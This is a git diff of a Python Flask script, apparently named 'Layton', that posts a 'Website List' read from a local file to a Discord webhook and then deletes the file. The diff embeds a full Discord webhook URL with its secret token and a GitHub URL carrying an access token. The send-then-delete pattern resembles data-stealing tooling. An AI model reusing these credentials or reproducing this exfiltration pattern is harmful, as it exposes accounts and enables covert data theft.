@@ -3,13 +3,14 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 import socket
 import requests
 import os
+from colorama import Style, Fore, Back
 
 try:
     os.remove("data_save.txt")
 except:
     print("An Error occured")
 # Put your webhook url here 
-discord_webhookURL = DiscordWebhook("https://raw.githubusercontent.com/zaqoQLF/layton/main/src/layton/config.py?token=GHSAT0AAAAAABYUUJWW5ZFKQ2GEFVRCJ4FMYZSFLLQ")
+discord_webhookURL = DiscordWebhook("https://discord.com/api/webhooks/1024004410004754555/uALb5rGNWwYJxpI011h6sAFTbHu9VMwIeVkcC8OXNM8aHJ5zOc1RuEW1unmRypWICn5Y")
 
 __data__ = Flask(__name__)
 
@@ -101,9 +102,6 @@ def discord_webhook():
         CLEARPARA.append(i.replace("'", ""))
 
 
-    print(DC_LIST) 
-    print("_____")
-    print(NEW_DC_LIST_CLEAR)
     embed = DiscordEmbed(description=f'> {CLEARPARA}', color='1b1b22')
     embed.set_author(name='Layton -  Website List')
     embed.set_footer(text='Layton - Python By Zaqo')
@@ -112,5 +110,6 @@ def discord_webhook():
     reponse = discord_webhookURL.execute()  
     rFile.close()
     os.remove("data_save.txt")
+    print(f'[{Fore.GREEN}+{Style.RESET_ALL}] - Webhook Successfully Sent !')
 
 
